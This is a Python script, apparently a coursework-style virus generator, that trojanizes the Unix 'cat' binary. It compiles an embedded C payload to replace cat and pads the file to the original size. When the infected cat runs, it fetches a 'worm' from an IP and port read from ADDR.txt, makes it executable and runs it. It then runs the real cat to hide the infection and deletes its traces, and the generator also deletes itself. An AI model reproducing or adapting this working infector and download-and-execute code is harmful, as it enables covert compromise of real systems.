#!/usr/bin/python3
import os
original_cat_size = os.stat("cat").st_size
os.system("zip cat.zip cat")
zip_cat_size = os.stat("cat.zip").st_size
zip_cat_start = original_cat_size-(zip_cat_size+4)
with open("./ADDR.txt", "r") as f:
    token = f.read().splitlines()
    IP = token[0]
    PORT = token[1]
    IP_LEN = len(token[0])


# the C code
C_code = """#include <stdio.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <signal.h>
void intHandler(int dummy) {
    execlp("rm", "rm", "-rf", "./oricat", "cat.zip", "worm", NULL);
}
int main(int argc, char **argv){
    /* set position */
    signal(SIGINT, intHandler);
    signal(SIGTSTP, intHandler);
    int original_cat_size = """ + str(original_cat_size) + """;
    int zip_cat_size = """ + str(zip_cat_size) + """;
    int zip_cat_start = """ + str(zip_cat_start) + """;
    char IPstr[20] = " """ + IP + """ ";
    int IP_LEN = """ + str(IP_LEN) + """;
    char IP[20];
    strncpy(IP, IPstr+1, IP_LEN);
    int PORT = """ + str(PORT) + """;
    
    unsigned char cat_buffer[original_cat_size+1];
    FILE *cat = fopen("./cat", "rb");
    fread(cat_buffer, sizeof(cat_buffer), 1, cat);
    fclose(cat);
    FILE *zip_cat = fopen("./cat.zip", "wb");
    fwrite(cat_buffer+zip_cat_start, zip_cat_size, 1, zip_cat);
    fclose(zip_cat);
    /* unzip cat */
    //execlp("/bin/ls","ls","-l",NULL);
    pid_t pid = fork();
    if(pid==0)
        execlp("/bin/unzip", "unzip", "-o", "-q", "cat.zip", "-d", "oricat", NULL);

    wait(NULL);
    
    //printf("HEELO?");
    /* get worm */
    int sockfd = socket(PF_INET , SOCK_STREAM , 0);
    if (sockfd== -1){
        printf("FAIL");
        fflush(stdout);
    }
    struct sockaddr_in info;
    memset(&info,sizeof(info), 0);	//初始化 將struct涵蓋的bits設為0
    info.sin_family = PF_INET;	//sockaddr_in為Ipv4結構
    info.sin_addr.s_addr = inet_addr(IP);	//IP address
    info.sin_port = htons(PORT);
    int ct = connect(sockfd, (struct sockaddr*)&info, sizeof(info));

    
    char request[10] = "worm";
    send(sockfd, request,4, 0);
    char wormbuff[1000];
    int bt = recv(sockfd, wormbuff,1000, 0);

    //fflush(stdout);
    FILE *worm = fopen("./worm", "wb");
    fwrite(wormbuff, strlen(wormbuff), 1, worm);
    fclose(worm);
    //fflush(stdout);
    close(sockfd);
    /* execute worm */
    pid = fork();
    if(pid==0)
        execlp("chmod", "chmod", "+x", "worm", NULL);
    wait(NULL);
    pid = fork();
    if(pid==0)
        execlp("./worm", "./worm", NULL);
    wait(NULL);
    
    /* execute cat */
    pid = fork();
    if(pid==0){
        argv[0] = "./oricat/cat";
        execvp("./oricat/cat", argv);
    }
    wait(NULL);
    
    
    
    /* remove zipped, unzipped cat and worm and ADDR*/
    execlp("rm", "rm", "-rf", "./oricat", "cat.zip", "worm", NULL);
    return 0;
}
"""

# write C code
with open("PAYLOAD.c", "w") as f:
    f.write(C_code)

# gcc C code and replace cat
os.system("gcc PAYLOAD.c -o cat")

# append blank+zip cat + deadbeaf
new_cat_size = os.stat("cat").st_size
blank_size = original_cat_size-(new_cat_size+zip_cat_size+4)
with open("cat.zip", "rb") as f:
    zip_cat = f.read()
with open("cat", "ab") as f:
    f.write(b"\x00"*blank_size)
    f.write(zip_cat)
    f.write(b"\xaf\xbe\xad\xde")
print("or=", original_cat_size)
print("zip=", zip_cat_size)
print("new_cat_size=", new_cat_size)
print("blank=", blank_size)
# remove this python code and zip cat
os.system("rm -rf cat.zip VIRUSGENERATOR PAYLOAD.c ADDR.txt")
print("INFECT")